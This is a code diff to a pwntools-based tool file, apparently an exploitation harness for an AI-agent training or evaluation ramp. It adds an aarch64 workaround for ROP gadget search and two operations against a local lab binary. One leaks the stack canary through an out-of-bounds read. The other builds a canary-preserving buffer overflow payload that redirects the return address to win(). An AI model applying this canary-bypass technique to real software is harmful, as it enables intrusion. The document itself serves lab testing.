@@ -188,9 +188,17 @@ def op_symbol(a):
     return {"name": name, "addr": e.symbols[name], "addr_hex": hex(e.symbols[name])}
 
 def op_gadgets(a):
+    # NOTE: broken on aarch64 in this image — pwntools' bundled ROPgadget references
+    # capstone's CS_ARCH_ARM64, which capstone 6.0 renamed to CS_ARCH_AARCH64, so
+    # ROP() raises NameError. Degrade gracefully with a clear message rather than
+    # throwing at the agent. The NX/ROP ramp rung is deferred until this is fixed
+    # (pin a compatible capstone/ROPgadget, or use ropper).
     e = ELF(BIN, checksec=False)
-    rop = ROP(e)
-    q = a.get("query", "ret")
+    try:
+        rop = ROP(e)
+    except Exception as ex:
+        return {"gadgets": {}, "error": f"gadget search unavailable on {e.arch}: {type(ex).__name__}: {ex}",
+                "note": "aarch64 ROP tooling (capstone/ROPgadget) needs an image fix; NX/ROP rung deferred"}
     found = {}
     for g in ("ret", "pop rdi", "pop rsi", "pop rax", "syscall"):
         try:
@@ -278,6 +286,59 @@ def op_exploit_leak(a):
         fired = os.path.exists("/tmp/objective_marker")
         fires += 1 if fired else 0
         results.append({"leaked": hex(leaked) if leaked else None, "exit": rc, "marker_fired": fired})
+    return {"times": times, "fires": fires, "reliability": fires / times if times else 0, "results": results}
+
+
+def _oob_leak(io, off):
+    # Drive the ramp3 out-of-bounds read: send the 8-byte offset, parse "mem@off=0x..".
+    io.send(int(off).to_bytes(8, "little"))
+    line = io.recvuntil(b"\n", timeout=5)
+    m = __import__("re").search(rb"=0x([0-9a-fA-F]+)", line)
+    return int(m.group(1), 16) if m else None
+
+def op_oob_read(a):
+    # Info-leak primitive (canary rung): disclose 8 bytes at buf+off. Reading the
+    # canary slot (off = buffer size) leaks the stack canary.
+    off = int(a["off"])
+    io = process([BIN])
+    try:
+        val = _oob_leak(io, off)
+    finally:
+        try: io.close()
+        except Exception: pass
+    return {"off": off, "value": val, "value_hex": hex(val) if val is not None else None}
+
+def op_exploit_canary(a):
+    # Leak the canary at canary_offset, PRESERVE it, and overwrite the saved return
+    # at ret_offset with win(). A naive overflow (no preserved canary) would trip
+    # __stack_chk_fail; this defeats the canary via the leak. Fires N times.
+    coff = int(a["canary_offset"]); roff = int(a["ret_offset"]); times = int(a.get("times", 5))
+    marker_env = a.get("marker", "")
+    win = ELF(BIN, checksec=False).symbols.get("win")
+    fires, results = 0, []
+    for _ in range(times):
+        try: os.remove("/tmp/objective_marker")
+        except FileNotFoundError: pass
+        env = dict(os.environ)
+        if marker_env: env["AEGIS_MARKER"] = marker_env
+        io = process([BIN], env=env); canary = None
+        try:
+            canary = _oob_leak(io, coff)
+            if canary is None or win is None:
+                rc = None
+            else:
+                payload = (b"A" * coff + canary.to_bytes(8, "little")
+                           + b"B" * (roff - coff - 8) + win.to_bytes(8, "little"))
+                io.send(payload)
+                rc = io.wait(timeout=5)
+        except Exception:
+            rc = None
+        finally:
+            try: io.close()
+            except Exception: pass
+        fired = os.path.exists("/tmp/objective_marker")
+        fires += 1 if fired else 0
+        results.append({"canary": hex(canary) if canary else None, "exit": rc, "marker_fired": fired})
     return {"times": times, "fires": fires, "reliability": fires / times if times else 0, "results": results}
 
 
